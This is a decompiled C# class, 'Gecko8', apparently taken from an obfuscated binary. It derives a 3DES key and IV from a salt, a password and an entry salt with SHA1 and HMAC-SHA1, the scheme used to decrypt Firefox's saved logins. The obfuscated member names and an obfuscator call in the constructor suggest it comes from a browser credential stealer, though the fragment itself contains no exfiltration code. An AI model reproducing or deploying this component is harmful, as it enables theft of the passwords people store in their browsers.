using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;

namespace who.Gecko
{
	// Token: 0x02000037 RID: 55
	public class Gecko8
	{
		// Token: 0x060001BD RID: 445 RVA: 0x00002CD0 File Offset: 0x00000ED0
		[CompilerGenerated]
		private byte[] method_0()
		{
			return this.byte_0;
		}

		// Token: 0x060001BE RID: 446 RVA: 0x00002CD8 File Offset: 0x00000ED8
		[CompilerGenerated]
		private byte[] method_1()
		{
			return this.byte_1;
		}

		// Token: 0x060001BF RID: 447 RVA: 0x00002CE0 File Offset: 0x00000EE0
		[CompilerGenerated]
		private byte[] modNspEqi6()
		{
			return this.byte_2;
		}

		// Token: 0x17000042 RID: 66
		// (get) Token: 0x060001C0 RID: 448 RVA: 0x00002CE8 File Offset: 0x00000EE8
		// (set) Token: 0x060001C1 RID: 449 RVA: 0x00002CF0 File Offset: 0x00000EF0
		public byte[] DataKey { get; private set; }

		// Token: 0x17000043 RID: 67
		// (get) Token: 0x060001C2 RID: 450 RVA: 0x00002CF9 File Offset: 0x00000EF9
		// (set) Token: 0x060001C3 RID: 451 RVA: 0x00002D01 File Offset: 0x00000F01
		public byte[] DataIV { get; private set; }

		// Token: 0x060001C4 RID: 452 RVA: 0x00002D0A File Offset: 0x00000F0A
		public Gecko8(byte[] salt, byte[] password, byte[] entry)
		{
			Class34.A1SfXVPz7w9eh();
			base..ctor();
			this.byte_0 = salt;
			this.byte_1 = password;
			this.byte_2 = entry;
		}

		// Token: 0x060001C5 RID: 453 RVA: 0x0000E414 File Offset: 0x0000C614
		public void method_2()
		{
			SHA1CryptoServiceProvider sha1CryptoServiceProvider = new SHA1CryptoServiceProvider();
			byte[] array = new byte[this.method_0().Length + this.method_1().Length];
			Array.Copy(this.method_0(), 0, array, 0, this.method_0().Length);
			Array.Copy(this.method_1(), 0, array, this.method_0().Length, this.method_1().Length);
			byte[] array2 = sha1CryptoServiceProvider.ComputeHash(array);
			byte[] array3 = new byte[array2.Length + this.modNspEqi6().Length];
			Array.Copy(array2, 0, array3, 0, array2.Length);
			Array.Copy(this.modNspEqi6(), 0, array3, array2.Length, this.modNspEqi6().Length);
			byte[] key = sha1CryptoServiceProvider.ComputeHash(array3);
			byte[] array4 = new byte[20];
			Array.Copy(this.modNspEqi6(), 0, array4, 0, this.modNspEqi6().Length);
			for (int i = this.modNspEqi6().Length; i < 20; i++)
			{
				array4[i] = 0;
			}
			byte[] array5 = new byte[array4.Length + this.modNspEqi6().Length];
			Array.Copy(array4, 0, array5, 0, array4.Length);
			Array.Copy(this.modNspEqi6(), 0, array5, array4.Length, this.modNspEqi6().Length);
			byte[] array6;
			byte[] array9;
			using (HMACSHA1 hmacsha = new HMACSHA1(key))
			{
				array6 = hmacsha.ComputeHash(array5);
				byte[] array7 = hmacsha.ComputeHash(array4);
				byte[] array8 = new byte[array7.Length + this.modNspEqi6().Length];
				Array.Copy(array7, 0, array8, 0, array7.Length);
				Array.Copy(this.modNspEqi6(), 0, array8, array7.Length, this.modNspEqi6().Length);
				array9 = hmacsha.ComputeHash(array8);
			}
			byte[] array10 = new byte[array6.Length + array9.Length];
			Array.Copy(array6, 0, array10, 0, array6.Length);
			Array.Copy(array9, 0, array10, array6.Length, array9.Length);
			this.DataKey = new byte[24];
			for (int j = 0; j < this.DataKey.Length; j++)
			{
				this.DataKey[j] = array10[j];
			}
			this.DataIV = new byte[8];
			int num = this.DataIV.Length - 1;
			for (int k = array10.Length - 1; k >= array10.Length - this.DataIV.Length; k--)
			{
				this.DataIV[num] = array10[k];
				num--;
			}
		}

		// Token: 0x040000C3 RID: 195
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private readonly byte[] byte_0;

		// Token: 0x040000C4 RID: 196
		[CompilerGenerated]
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		private readonly byte[] byte_1;

		// Token: 0x040000C5 RID: 197
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private readonly byte[] byte_2;

		// Token: 0x040000C6 RID: 198
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private byte[] UxxNeyeWjL;

		// Token: 0x040000C7 RID: 199
		[DebuggerBrowsable(DebuggerBrowsableState.Never)]
		[CompilerGenerated]
		private byte[] byte_3;
	}
}
